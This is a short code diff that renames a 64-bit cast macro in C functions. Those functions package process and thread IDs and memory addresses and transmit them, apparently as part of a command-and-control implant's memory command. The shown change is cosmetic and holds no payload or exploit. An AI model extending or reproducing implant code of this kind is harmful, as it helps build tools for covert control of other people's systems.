@@ -126,7 +126,7 @@ _Leave:
 
     PackageAddInt32( BK_PACKAGE, ProcessId );
     PackageAddInt32( BK_PACKAGE, ThreadId );
-    PackageAddInt64( BK_PACKAGE, C_U64( MemAllocated ) );
+    PackageAddInt64( BK_PACKAGE, U_64( MemAllocated ) );
     PackageAddInt32( BK_PACKAGE, RegionSize );
     PackageTransmit( BK_PACKAGE, NULL, NULL );    
 }
@@ -151,7 +151,7 @@ FUNC VOID CommandMemory(
                 return;
             }
 
-            PackageAddInt64( BK_PACKAGE, C_U64( BaseAddr ) );
+            PackageAddInt64( BK_PACKAGE, U_64( BaseAddr ) );
             PackageTransmit( BK_PACKAGE, NULL, NULL );
         }
         
